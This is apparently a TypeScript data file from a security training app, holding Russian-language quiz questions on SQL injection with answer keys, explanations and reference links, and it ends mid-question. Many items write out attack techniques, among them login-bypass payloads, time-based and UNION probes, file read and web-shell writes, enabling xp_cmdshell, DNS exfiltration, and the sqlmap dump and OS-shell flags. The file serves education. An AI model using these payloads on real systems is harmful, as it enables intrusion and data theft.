export interface QuizQuestion {
    question: string;
    answers: string[];
    correctAnswerIndex: number;
    explanation?: string;
    link?: {
        label: string;
        url: string;
    };
}

export const quizQuestions: QuizQuestion[] = [
    {
        question: "Что такое SQL Injection?",
        answers: [
            "Уязвимость, позволяющая злоумышленнику вмешиваться в запросы, которые приложение делает к своей базе данных",
            "Ошибка конфигурации сервера базы данных, дающая root-доступ",
            "Тип атаки, направленный на переполнение буфера базы данных",
            "Внедрение вредоносных стилей CSS в административную панель",
            "Метод оптимизации SQL-запросов через инъекцию индексов",
            "Уязвимость, позволяющая внедрять JavaScript код в SQL процедуры",
            "Способ обхода файрвола через SQL-порт 1433"
        ],
        correctAnswerIndex: 0,
        explanation: "SQL Injection возникает, когда недоверенные данные пользователя конкатенируются с SQL-запросом динамически, позволяя изменять логику запроса.",
        link: {
            label: "PortSwigger: SQL Injection",
            url: "https://portswigger.net/web-security/sql-injection"
        }
    },
    {
        question: "Какой символ чаще всего используется для начала тестирования на SQL Injection (разрыв строки)?",
        answers: [
            "Одинарная кавычка (')",
            "Точка с запятой (;)",
            "Двойной дефис (--)",
            "Звездочка (*)",
            "Знак процента (%)",
            "Обратный слэш (\\)",
            "Тильда (~)"
        ],
        correctAnswerIndex: 0,
        explanation: "Одинарная кавычка (') используется для ограничения строковых литералов в SQL. Ввод кавычки часто ломает синтаксис запроса, вызывая ошибку, что сигнализирует об уязвимости.",
        link: {
            label: "PortSwigger SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Что означает пейлоад `' OR 1=1 --` в контексте аутентификации?",
        answers: [
            "Это 'тавтология', которая делает условие WHERE всегда истинным, позволяя войти без пароля как первый пользователь (обычно admin)",
            "Это специальная команда администратора, которая принудительно удаляет базу данных без возможности восстановления и очищает логи",
            "Это стандартный SQL-запрос, используемый для получения текущей версии базы данных и списка активных пользователей системы",
            "Это попытка вызвать отказ в обслуживании (DoS), перегружая сервер бесконечными рекурсивными запросами к таблице пользователей",
            "Это синтаксис для создания нового пользователя с правами администратора и автоматической генерацией надежного пароля",
            "Это устаревшая команда для шифрования всех паролей в базе данных с использованием алгоритма MD5 или SHA-1",
            "Это стандартный метод сброса пароля, который используется системными администраторами для восстановления доступа"
        ],
        correctAnswerIndex: 0,
        explanation: "Условие '1'='1' всегда истинно. OR делает всё выражение истинным. -- отбрасывает (комментирует) остаток оригинального запроса (например, проверку пароля).",
        link: {
            label: "OWASP: Testing for SQL Injection",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
        }
    },
    {
        question: "Что такое Union-based SQL Injection?",
        answers: [
            "Техника, использующая оператор UNION для объединения результатов оригинального запроса с результатами инъекцированного запроса",
            "Метод объединения нескольких баз данных в одну виртуальную структуру для упрощения администрирования",
            "Атака на 'профсоюзы' (unions) разработчиков, направленная на кражу проприетарного исходного кода приложений",
            "Способ соединения с базой через защищенный VPN-туннель, используя уязвимость в протоколе шифрования",
            "Инъекция, работающая только в United States, так как использует специфические региональные настройки кодировки",
            "Метод атаки на структуры `union` в языке программирования C++, вызывающий переполнение буфера памяти",
            "Техника объединения таблиц для оптимизации производительности запросов путем создания материализованных представлений"
        ],
        correctAnswerIndex: 0,
        explanation: "UNION SELECT позволяет атакующему получить данные из других таблиц, добавив их к результатам легитимного запроса, при условии совпадения количества колонок и типов данных.",
        link: {
            label: "PortSwigger: SQLi UNION attacks",
            url: "https://portswigger.net/web-security/sql-injection/union-attacks"
        }
    },
    {
        question: "Какое главное требование для успешной атаки Union-based?",
        answers: [
            "Количество возвращаемых колонок и их типы данных должны совпадать в обоих запросах (оригинальном и внедряемом)",
            "Имена колонок в обоих запросах должны быть абсолютно идентичными, включая регистр символов",
            "Таблицы должны иметь явно определенный внешний ключ (Foreign Key) для связи данных между собой",
            "База данных должна быть обязательно MySQL версии 8.0 или выше, так как другие СУБД не поддерживают UNION",
            "Пользователь, от имени которого выполняется запрос, должен обладать правами системного администратора",
            "Запрос должен быть типа UPDATE или DELETE, так как SELECT запросы не поддерживают оператор UNION",
            "Web Application Firewall (WAF) должен быть полностью отключен, иначе он заблокирует ключевое слово UNION"
        ],
        correctAnswerIndex: 0,
        explanation: "Оператор UNION требует, чтобы оба SELECT возвращали одинаковое количество столбцов и типы данных в соответствующих столбцах были совместимы.",
        link: {
            label: "PortSwigger: Determining columns",
            url: "https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns"
        }
    },
    {
        question: "Как можно определить количество колонок в запросе для Union-based SQLi?",
        answers: [
            "Используя `ORDER BY X` (увеличивая X) или `UNION SELECT NULL, NULL...`",
            "Используя `SELECT COUNT(*)`",
            "Используя `SHOW COLUMNS`",
            "Только путем анализа исходного кода",
            "С помощью команды `DESCRIBE table`",
            "Отгадывая имена колонок",
            "Используя `length(column)`"
        ],
        correctAnswerIndex: 0,
        explanation: "Инкрементирование `ORDER BY 1`, `ORDER BY 2`... вызовет ошибку, когда номер превысит количество колонок. `UNION SELECT NULL` работает аналогично.",
        link: {
            label: "PortSwigger: Determining columns count",
            url: "https://portswigger.net/web-security/sql-injection/union-attacks"
        }
    },
    {
        question: "Что такое Blind SQL Injection?",
        answers: [
            "Тип SQLi, где приложение не возвращает данные базы данных в ответе, но изменяет свое поведение в зависимости от истинности условия",
            "SQL инъекция, выполняемая 'вслепую' без подключения к интернету, используя только локальные уязвимости сервера",
            "Атака на скрытые (blind) системные таблицы, которые невидимы для обычных пользователей и администраторов",
            "Инъекция, которая не оставляет никаких следов в системных логах (access logs) веб-сервера",
            "Тип атаки, 'ослепляющий' администратора путем блокировки доступа к консоли управления базой данных",
            "Инъекция вредоносного CSS кода, который делает содержимое страницы невидимым для пользователя",
            "Уязвимость, которую невозможно обнаружить автоматическими сканерами, так как она требует ручного ввода капчи"
        ],
        correctAnswerIndex: 0,
        explanation: "При Blind SQLi атакующий задает базе вопросы «Да/Нет» (например, 'AND 1=1' vs 'AND 1=2') и судит по ответу сервера (ошибка, пустая страница, задержка).",
        link: {
            label: "PortSwigger: Blind SQL injection",
            url: "https://portswigger.net/web-security/sql-injection/blind"
        }
    },
    {
        question: "Чем отличается Boolean-based Blind SQLi от Time-based Blind SQLi?",
        answers: [
            "Boolean-based анализирует различия в контенте/коде ответа, Time-based анализирует задержку ответа (время отклика)",
            "Boolean-based работает только с boolean типами данных (TRUE/FALSE), Time-based работает только с полями типа DATE и TIMESTAMP",
            "Boolean-based выполняется значительно быстрее, чем Time-based, так как не требует ожидания ответа от сервера",
            "Time-based требует прав администратора для использования функций задержки времени, в то время как Boolean-based работает с правами гостя",
            "Boolean-based работает только в MySQL, тогда как Time-based является универсальным для всех типов баз данных",
            "Time-based используется исключительно для проведения DoS атак путем исчерпания пула соединений, а не для кражи данных",
            "Ничем принципиально не отличаются, это просто разные названия одной и той же техники эксплуатации уязвимости"
        ],
        correctAnswerIndex: 0,
        explanation: "В Boolean-based мы ищем визуальные отличия (Размер страницы, Текст 'Found/Not Found'). В Time-based мы используем `SLEEP()` и ждем, если сервер 'зависнет'.",
        link: {
            label: "OWASP: Blind SQL Injection",
            url: "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
        }
    },
    {
        question: "Какая функция используется для Time-based инъекции в MySQL?",
        answers: [
            "SLEEP(seconds)",
            "WAITFOR DELAY",
            "PG_SLEEP()",
            "TIMEOUT()",
            "PAUSE()",
            "DELAY()",
            "USLEEP()"
        ],
        correctAnswerIndex: 0,
        explanation: "В MySQL используется `SLEEP(n)`. `WAITFOR DELAY` — это MSSQL. `pg_sleep()` — PostgreSQL.",
        link: {
            label: "PortSwigger SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Какая функция используется для Time-based инъекции в PostgreSQL?",
        answers: [
            "pg_sleep(seconds)",
            "SLEEP()",
            "WAITFOR DELAY",
            "dbms_lock.sleep()",
            "wait()",
            "delay_execution()",
            "time_wait()"
        ],
        correctAnswerIndex: 0,
        explanation: "В PostgreSQL стандартная функция задержки — `pg_sleep()`. `SLEEP` — для MySQL.",
        link: {
            label: "PostgreSQL: Delay Execution",
            url: "https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-DELAY"
        }
    },
    {
        question: "Какая конструкция используется для Time-based инъекции в MS SQL Server?",
        answers: [
            "WAITFOR DELAY '0:0:5'",
            "SLEEP(5)",
            "pg_sleep(5)",
            "CALL SLEEP(5)",
            "EXECUTE DELAY 5",
            "PAUSE 5",
            "TIMEOUT 5"
        ],
        correctAnswerIndex: 0,
        explanation: "MSSQL использует синтаксис `WAITFOR DELAY 'hh:mm:ss'` или `WAITFOR TIME`.",
        link: {
            label: "Microsoft: WAITFOR",
            url: "https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql"
        }
    },
    {
        question: "Что такое Error-based SQL Injection?",
        answers: [
            "Техника, заставляющая базу данных выводить информацию о своей структуре или данных в сообщениях об ошибках, возвращаемых приложением",
            "Инъекция ошибок в логику приложения для вызова аварийного завершения работы сервера и перезагрузки системы",
            "Умышленное удаление таблицы системных логов ошибок для сокрытия следов присутствия злоумышленника в системе",
            "Взлом веб-приложения через страницу обработки ошибки 404 (Not Found) путем подмены URL адресов",
            "Переполнение журнала ошибок сервера мусорными данными с целью затруднить анализ инцидентов безопасности",
            "Подмена стандартных сообщений об ошибках базы данных на фишинговые страницы для кражи учетных данных администратора",
            "Атака на систему обработки исключений Java (Exception Handling), заставляющая приложение выводить стектрейсы"
        ],
        correctAnswerIndex: 0,
        explanation: "Если приложение выводит подробные ошибки БД пользователю, атакующий может сформировать запрос так, чтобы данные (например, version()) попали в текст ошибки.",
        link: {
            label: "PortSwigger: Information retrieval",
            url: "https://portswigger.net/web-security/sql-injection#retrieving-hidden-data"
        }
    },
    {
        question: "Какой символ обозначает комментарий до конца строки в MySQL?",
        answers: [
            "# или -- (с пробелом после)",
            "//",
            "<!--",
            ";",
            "/*",
            "%%",
            "||"
        ],
        correctAnswerIndex: 0,
        explanation: "В MySQL `#` комментирует до конца строки. `-- ` (два дефиса и пробел) — стандартный SQL комментарий. Без пробела в MySQL `--` может не сработать.",
        link: {
            label: "MySQL Comments",
            url: "https://dev.mysql.com/doc/refman/8.0/en/comments.html"
        }
    },
    {
        question: "Какой символ обозначает комментарий в MS SQL Server?",
        answers: [
            "--",
            "#",
            "//",
            ";;",
            "REM",
            "note:",
            "%%"
        ],
        correctAnswerIndex: 0,
        explanation: "В T-SQL (MSSQL) `--` используется для однострочных комментариев. `/* ... */` — для многострочных.",
        link: {
            label: "MSSQL Comments",
            url: "https://learn.microsoft.com/en-us/sql/t-sql/language-elements/comment-transact-sql"
        }
    },
    {
        question: "Как узнать версию базы данных в MySQL?",
        answers: [
            "SELECT @@version или SELECT version()",
            "SELECT * FROM v$version",
            "SELECT banner FROM v$version",
            "SHOW VER",
            "GET VERSION",
            "INFO DATABASE",
            "DISPLAY VERSION"
        ],
        correctAnswerIndex: 0,
        explanation: "`@@version` — системная переменная, `version()` — функция. Обе возвращают строку версии MySQL.",
        link: {
            label: "PortSwigger: SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Как узнать версию базы данных в Oracle?",
        answers: [
            "SELECT banner FROM v$version",
            "SELECT version()",
            "SELECT @@version",
            "SHOW VERSION",
            "SELECT info FROM system",
            "Oracle.getVersion()",
            "GET_VERSION_INFO"
        ],
        correctAnswerIndex: 0,
        explanation: "В Oracle версия хранится в представлении `v$version`. Запрос обычно выглядит как `SELECT banner FROM v$version`.",
        link: {
            label: "PortSwigger: SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Что такое Second-Order SQL Injection?",
        answers: [
            "Атака, при которой вредоносный ввод сохраняется в базе данных и выполняется позже, когда приложение обрабатывает эти данные в другом запросе",
            "Инъекция, использующая два одновременных запроса HTTP для создания состояния гонки (Race Condition) в базе данных",
            "Атака на вторичный сервер базы данных (Slave/Replica), который обычно защищен слабее основного сервера",
            "Инъекция, использующая специальные символы двойных кавычек второй степени вложенности для обхода простых фильтров",
            "Атака второго уровня сложности по шкале CVSS, требующая физического доступа к серверному оборудованию",
            "Инъекция в заголовки HTTP второго порядка (например, X-Forwarded-For), которые обрабатываются прокси-сервером",
            "Взлом резервной копии базы данных, хранящейся на отдельном носителе, с целью получения исторических данных"
        ],
        correctAnswerIndex: 0,
        explanation: "При Second-Order (Stored) SQLi, payload сначала безопасно сохраняется (например, при регистрации), а срабатывает, когда приложение использует эти данные в небезопасном SQL-запросе в другом месте.",
        link: {
            label: "PortSwigger: Second-order SQLi",
            url: "https://portswigger.net/web-security/sql-injection#second-order-sql-injection"
        }
    },
    {
        question: "Какая защита от SQL Injection считается «Золотым стандартом»?",
        answers: [
            "Использование параметризованных запросов (Prepared Statements)",
            "Использование Web Application Firewall (WAF)",
            "Экранирование всех кавычек функцией replace",
            "Использование хранимых процедур (без динамического SQL)",
            "Валидация ввода регулярными выражениями",
            "Отключение сообщений об ошибках",
            "Использование только NoSQL баз данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Parametrization отделяет код запроса от данных. База данных трактует ввод строго как данные, никогда как исполняемый код, что устраняет SQLi.",
        link: {
            label: "OWASP: SQL Prevention Cheat Sheet",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Гарантирует ли WAF полную защиту от SQL Injection?",
        answers: [
            "Нет, WAF можно обойти, используя различные техники обфускации, нестандартные кодировки или логические особенности конкретной СУБД",
            "Да, современные WAF с искусственным интеллектом гарантированно блокируют 100% известных и неизвестных атак",
            "Да, но только если WAF настроен на работу в режиме 'Block Mode' и обновляется ежедневно",
            "Только от простых скриптовых атак, но специализированные AI-решения защищают полностью от любых угроз",
            "Да, если использовать облачный WAF от ведущих провайдеров (например, Cloudflare), так как они видят весь трафик интернета",
            "Только если база данных регулярно патчится и используются последние версии драйверов подключения",
            "Да, это единственная надежная защита, так как исправить уязвимости в коде старых приложений практически невозможно"
        ],
        correctAnswerIndex: 0,
        explanation: "WAF работает на основе сигнатур и правил. Хакеры постоянно находят способы обойти фильтры (например, используя редкие функции SQL или альтернативные кодировки).",
        link: {
            label: "OWASP: WAF Evasion",
            url: "https://owasp.org/www-community/attacks/Web_Application_Firewall_WAF_Evasion_Techniques"
        }
    },
    {
        question: "Для чего используется инструмент sqlmap?",
        answers: [
            "Для автоматического обнаружения и эксплуатации уязвимостей SQL Injection, а также для полной выгрузки данных из базы",
            "Для создания подробных карт связей таблиц (ER-диаграмм) базы данных с целью реверс-инжиниринга",
            "Для визуализации производительности SQL-запросов и поиска узких мест в работе базы данных",
            "Для автоматической оптимизации медленных SQL-запросов и добавления необходимых индексов",
            "Для генерации безопасного SQL-кода на основе предоставленных моделей данных и шаблонов",
            "Для создания полных резервных копий (бэкапов) баз данных MySQL и PostgreSQL по расписанию",
            "Для мониторинга подозрительной активности пользователей базы данных в реальном времени"
        ],
        correctAnswerIndex: 0,
        explanation: "sqlmap — это мощный open-source инструмент, автоматизирующий процесс поиска SQLi, определения типа БД, извлечения данных и даже получения OS shell.",
        link: {
            label: "sqlmap.org",
            url: "https://sqlmap.org/"
        }
    },
    {
        question: "Какой флаг sqlmap используется для дампа всей базы данных?",
        answers: [
            "--dump или --dump-all",
            "--extract-db",
            "--get-everything",
            "--full-dump",
            "--download-db",
            "--mirror-db",
            "--access-db"
        ],
        correctAnswerIndex: 0,
        explanation: "--dump используется для извлечения данных. Если не указаны конкретные таблицы, он попытается сдампить всё, до чего дотянется.",
        link: {
            label: "sqlmap Usage",
            url: "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
        }
    },
    {
        question: "Какой флаг sqlmap позволяет попытаться получить интерактивный shell ОС?",
        answers: [
            "--os-shell",
            "--system-shell",
            "--cmd-shell",
            "--bash",
            "--terminal",
            "--pwn",
            "--get-rce"
        ],
        correctAnswerIndex: 0,
        explanation: "--os-shell пытается загрузить веб-шелл или использовать функции БД (xp_cmdshell) для выполнения команд ОС.",
        link: {
            label: "sqlmap os-shell",
            url: "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
        }
    },
    {
        question: "Можно ли читать локальные файлы сервера через SQL Injection в MySQL?",
        answers: [
            "Да, используя функцию `LOAD_FILE()`, если у пользователя есть файловые привилегии и настройки сервера (`secure_file_priv`) позволяют это",
            "Нет, MySQL принципиально не имеет функциональности для работы с файловой системой сервера ради безопасности",
            "Всегда, по умолчанию доступ открыт ко всем файлам системы, включая системные конфигурационные файлы",
            "Только файлы с расширением .txt, так как бинарные файлы могут повредить структуру базы данных при чтении",
            "Только если сервер базы данных запущен в среде Windows, в Linux доступ к файловой системе полностью заблокирован",
            "Да, но только временные файлы, находящиеся в директории `/tmp` или ее аналогах, созданные самим процессом MySQL",
            "Только через анализ стека ошибок (Error-based), заставляя сервер включать содержимое файла в текст ошибки"
        ],
        correctAnswerIndex: 0,
        explanation: "Функция LOAD_FILE('/path/to/file') читает содержимое файла и возвращает его как строку. Требует прав и настройки.",
        link: {
            label: "MySQL: LOAD_FILE",
            url: "https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file"
        }
    },
    {
        question: "Как записать произвольный файл на сервер в MySQL (Web Shell)?",
        answers: [
            "Используя SELECT ... INTO OUTFILE '/path/to/file'",
            "Используя WRITE_FILE()",
            "Используя INSERT INTO FILE ...",
            "Используя UPLOAD ...",
            "Через команду SAVE AS",
            "Используя OUTPUT ...",
            "Нельзя записать файл"
        ],
        correctAnswerIndex: 0,
        explanation: "INTO OUTFILE перенаправляет результат запроса в файл на сервере. Это классический способ, если есть права на запись.",
        link: {
            label: "PortSwigger: Writing files",
            url: "https://portswigger.net/support/using-sql-injection-to-write-files-to-the-filesystem"
        }
    },
    {
        question: "Что такое Out-of-Band (OOB) SQL Injection?",
        answers: [
            "Техника, когда данные извлекаются через сторонний канал (например, DNS или HTTP запросы), инициируемый сервером базы данных",
            "Инъекция, происходящая 'вне группы' (Out of Band), то есть выполняемая не авторизованным пользователем",
            "Атака на музыкальные сервисы и стриминговые платформы с целью получения бесплатного доступа к контенту",
            "Атака, использующая нестандартный диапазон частот Wi-Fi для передачи команд на сервер базы данных",
            "Инъекция в HTTP заголовки, отвечающие за пропускную способность (Bandwidth), для вызова перегрузки канала",
            "Метод IP-спуфинга, при котором ответы от сервера направляются на адрес жертвы, а не атакующего",
            "Атака на логические операторы 'OUT' в хранимых процедурах Oracle, вызывающая утечку памяти"
        ],
        correctAnswerIndex: 0,
        explanation: "OOB используется, когда Blind SQLi слишком медленный или фильтруется, но сервер может делать DNS/HTTP запросы (например, через xp_dirtree, UTL_HTTP).",
        link: {
            label: "OWASP: OOB SQLi",
            url: "https://owasp.org/www-community/attacks/SQL_Injection"
        }
    },
    {
        question: "Какая функция в Oracle может быть использована для Out-of-Band (DNS) инъекции?",
        answers: [
            "UTL_INADDR.GET_HOST_ADDRESS() или UTL_HTTP.REQUEST()",
            "DNS_REQUEST()",
            "ORACLE_DNS()",
            "NETWORK_PING()",
            "GET_HOST()",
            "CONNECT_BY_ROOT()",
            "SYS.DNS_LOOKUP()"
        ],
        correctAnswerIndex: 0,
        explanation: "Пакеты UTL_INADDR и UTL_HTTP позволяют отправлять сетевые запросы. Передав доменное имя, контролируемое атакующим, можно получить IP (DNS запрос), подтверждая инъекцию.",
        link: {
            label: "PortSwigger: OOB via DNS",
            url: "https://portswigger.net/web-security/sql-injection/blind#out-of-band-sql-injection"
        }
    },
    {
        question: "Какая хранимая процедура в MS SQL Server позволяет выполнять команды операционной системы?",
        answers: [
            "xp_cmdshell",
            "sp_execute_external_script",
            "xp_exec",
            "sp_oacreate",
            "xp_run_cmd",
            "sys.execute",
            "cmd.run"
        ],
        correctAnswerIndex: 0,
        explanation: "xp_cmdshell — это расширенная хранимая процедура, которая создает командную оболочку Windows и передает ей строку для выполнения.",
        link: {
            label: "Microsoft: xp_cmdshell",
            url: "https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql"
        }
    },
    {
        question: "Как включить xp_cmdshell в MSSQL, если она отключена (и есть права SA)?",
        answers: [
            "Выполнить команду `sp_configure 'xp_cmdshell', 1; RECONFIGURE;` для активации расширенной хранимой процедуры и обновления конфигурации",
            "Достаточно просто запустить службу `SQL Server Agent` и перезапустить сервис базы данных для применения изменений",
            "Использовать команду `ENABLE PROCEDURE xp_cmdshell` с правами системного администратора в консоли управления",
            "Изменить параметр реестра Windows `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSSQLServer\\xp_cmdshell` на 1",
            "Выдать права `GRANT EXECUTE ON xp_cmdshell TO PUBLIC`, чтобы разрешить всем пользователям использовать эту процедуру",
            "Использовать команду `ALTER SERVER CONFIGURATION SET xp_cmdshell ON` (только для Azure SQL Database)",
            "Это невозможно сделать из SQL запроса, требуется физический доступ к серверу и изменение файла конфигурации"
        ],
        correctAnswerIndex: 0,
        explanation: "Сначала нужно включить 'show advanced options', затем 'xp_cmdshell' через sp_configure и применить изменения через RECONFIGURE.",
        link: {
            label: "HackTricks: MSSQL RCE",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection#xp_cmdshell"
        }
    },
    {
        question: "Что такое 'Stacked Queries' (Стековые запросы)?",
        answers: [
            "Возможность выполнения нескольких SQL-запросов за один раз, разделенных точкой с запятой (;)",
            "Запросы, использующие структуру данных Stack (LIFO)",
            "Специальный вид JOIN запросов",
            "Вложенные подзапросы (Subqueries)",
            "Запросы с оператором UNION",
            "Рекурсивные CTE запросы",
            "Переполнение стека базы данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Если приложение и драйвер (например, PHP + PDO) поддерживают stacked queries, атакующий может завершить оригинальный запрос и выполнить любой другой (DROP TABLE, INSERT admin...).",
        link: {
            label: "PortSwigger: SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Поддерживаются ли Stacked Queries в стандартной конфигурации PHP + MySQL (mysqli)?",
        answers: [
            "Нет, стандартная функция `query()` (и старая `mysql_query`) в PHP намеренно не поддерживает множественные запросы ради безопасности (требуется `multi_query`)",
            "Да, они всегда поддерживаются по умолчанию, если используется драйвер `mysqlnd` последней версии",
            "Только в версии PHP 8.0 и выше, где эта функциональность была включена для совместимости с PostgreSQL",
            "Только на Linux серверах, использующих системные библиотеки MySQL client, в отличие от Windows версий",
            "Да, но только если в конфигурации `php.ini` явно включена директива `mysql.allow_stacked_queries`",
            "Только для запросов типа `SELECT`, так как модифицирующие запросы блокируются на уровне драйвера",
            "Поддерживаются только через расширение PDO, если при подключении передан специальный флаг эмуляции"
        ],
        correctAnswerIndex: 0,
        explanation: "MySQL драйверы в PHP (mysqli, mysql старый) по умолчанию запрещают batch-запросы для безопасности. PDO может поддерживать их в зависимости от настроек эмуляции.",
        link: {
            label: "OWASP: SQL Injection Prevention",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Как можно определить тип базы данных (Fingerprinting) используя конкатенацию строк?",
        answers: [
            "В Oracle работает оператор `||` (или `CONCAT`), в MSSQL только `+`, в MySQL работает пробел или функция `CONCAT()`",
            "Во всех современных базах данных унифицирован оператор `+` согласно последнему стандарту ANSI SQL",
            "Во всех реляционных базах данных работает только оператор `||` для совместимости с Oracle",
            "Везде работает только функция `CONCAT()`, так как операторы считаются устаревшим стилем",
            "В Oracle используется точка (`.`) для конкатенации, как в PHP, в остальных базах — плюс",
            "Используя команду `VERSION()` или `@@VERSION`, которая возвращает одинаковый формат во всех БД",
            "По цвету сообщения об ошибке: MySQL — красный, Oracle — желтый, MSSQL — синий"
        ],
        correctAnswerIndex: 0,
        explanation: "Разные СУБД используют разные операторы для склеивания строк. || (Oracle/Postgres), + (MSSQL), пробел или CONCAT (MySQL).",
        link: {
            label: "PortSwigger: SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "В какой СУБД существует специальная таблица 'dual'?",
        answers: [
            "Oracle и MySQL",
            "Только MSSQL",
            "Только PostgreSQL",
            "SQLite",
            "MongoDB",
            "Redis",
            "Access"
        ],
        correctAnswerIndex: 0,
        explanation: "Таблица DUAL — это специальная таблица в Oracle с одной строкой и столбцом. В MySQL она также существует для совместимости. Используется для SELECT констант.",
        link: {
            label: "Oracle: DUAL",
            url: "https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm"
        }
    },
    {
        question: "Что делает атака HTTP Parameter Pollution (HPP) в контексте WAF?",
        answers: [
            "Позволяет обойти WAF, передавая параметр дважды (id=1&id=evil), если WAF проверяет первое значение, а приложение использует второе (или наоборот)",
            "Техника 'загрязнения' параметров HTTP заголовками, вызывающая переполнение буфера в модуле обработки запросов веб-сервера",
            "Метод, вызывающий отказ в обслуживании (DoS) путем отправки тысяч случайных параметров в одном GET запросе",
            "Атака на HTTPS сертификаты, позволяющая подменить публичный ключ сервера через дублирующийся параметр",
            "Изменяет метод HTTP запроса с GET на POST и добавляет вредоносные параметры в тело запроса, которые WAF не сканирует",
            "Удаляет все параметры из запроса, заставляя приложение использовать значения по умолчанию, которые могут быть небезопасными",
            "Внедряет вредоносный код в Cookies пользователя, используя особенности парсинга повторяющихся заголовков Set-Cookie"
        ],
        correctAnswerIndex: 0,
        explanation: "Разные серверы (Apache, IIS, Nginx, Tomcat) и языки (PHP, ASP.NET, Java) по-разному обрабатывают дубликаты параметров. Рассинхронизация между WAF и бэкендом позволяет пронести пэйлоад.",
        link: {
            label: "OWASP: Testing for HPP",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
        }
    },
    {
        question: "Какой SQL запрос обычно используется для обхода логина (Authentication Bypass)?",
        answers: [
            "' OR '1'='1",
            "admin' --",
            "' OR TRUE --",
            "admin' #",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1 --",
            "Все вышеперечисленные"
        ],
        correctAnswerIndex: 6,
        explanation: "Суть обхода логина — сделать условие WHERE истинным для первой найденной записи (обычно админа) или закомментировать проверку пароля.",
        link: {
            label: "PortSwigger: SQLi Login Bypass",
            url: "https://portswigger.net/web-security/sql-injection/lab-login-bypass"
        }
    },
    {
        question: "Что такое 'Boolean Inference' (Blind SQLi)?",
        answers: [
            "Метод извлечения данных путем задания серии вопросов 'Да/Нет' (True/False) и наблюдения за реакцией приложения (код ответа, длина контента)",
            "Использование алгоритмов машинного обучения для предсказания структуры базы данных на основе сообщений об ошибках",
            "Ошибка логического типа данных `BOOLEAN`, когда вместо `TRUE` в базу записывается `NULL`, вызывая сбой логики",
            "Специфическая инъекция в поля типа `BIT` или `BOOL`, позволяющая инвертировать значения флагов доступа",
            "Метод оптимизации запросов, при котором база данных предварительно вычисляет все логические условия",
            "Атака на булеву алгебру процессора сервера, вызывающая ошибки вычислений с плавающей запятой",
            "Техника гадания параметров подключения к базе данных путем перебора логинов и паролей (Brute Force)"
        ],
        correctAnswerIndex: 0,
        explanation: "Если ответ сервера отличается для истинного (AND 1=1) и ложного (AND 1=2) условий, атакующий может побитово сбрутить любые данные из БД.",
        link: {
            label: "OWASP: Boolean Blind SQLi",
            url: "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
        }
    },
    {
        question: "Как можно объединить значения из нескольких строк в одну (например, список всех таблиц) в MySQL?",
        answers: [
            "Используя GROUP_CONCAT(column_name)",
            "Используя CONCAT_ALL()",
            "Используя MERGE()",
            "Используя JOIN_STRING()",
            "Используя LISTAGG()",
            "Используя SUM(string)",
            "Это невозможно в MySQL"
        ],
        correctAnswerIndex: 0,
        explanation: "GROUP_CONCAT() — невероятно полезная функция для SQL Injection, так как позволяет извлечь содержимое целой таблицы за один запрос (в одной ячейке).",
        link: {
            label: "MySQL: GROUP_CONCAT",
            url: "https://dev.mysql.com/doc/refman/8.0/en/group-by-functions.html#function_group-concat"
        }
    },
    {
        question: "Какая функция возвращает имя текущей базы данных в MySQL и PostgreSQL?",
        answers: [
            "database() в MySQL, current_database() в PostgreSQL",
            "db_name() везде",
            "get_current_db()",
            "whoami()",
            "show_db()",
            "select_db()",
            "info()"
        ],
        correctAnswerIndex: 0,
        explanation: "Узнать имя текущей БД — важный этап разведки. В MSSQL это db_name(), в Oracle — select name from v$database (или user).",
        link: {
            label: "PortSwigger: SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "В какой стандартной схеме (schema) хранится мета-информация о таблицах и колонках в большинстве SQL баз данных?",
        answers: [
            "information_schema",
            "sys_schema",
            "meta_data",
            "master_db",
            "system_tables",
            "root_schema",
            "admin_view"
        ],
        correctAnswerIndex: 0,
        explanation: "INFORMATION_SCHEMA — это стандарт ANSI SQL. Запрос к information_schema.tables позволяет получить список всех таблиц.",
        link: {
            label: "MySQL: INFORMATION_SCHEMA",
            url: "https://dev.mysql.com/doc/refman/8.0/en/information-schema.html"
        }
    },
    {
        question: "Почему пейлоад типа `' OR '1'='1` (или `1=1`) часто используется для обхода аутентификации?",
        answers: [
            "Это 'тавтология' (выражение, которое всегда истинно). В сочетании с OR она делает истинным всё условие проверки доступа",
            "Это 'магическое число' в SQL, которое используется разработчиками как универсальный мастер-ключ для отладки",
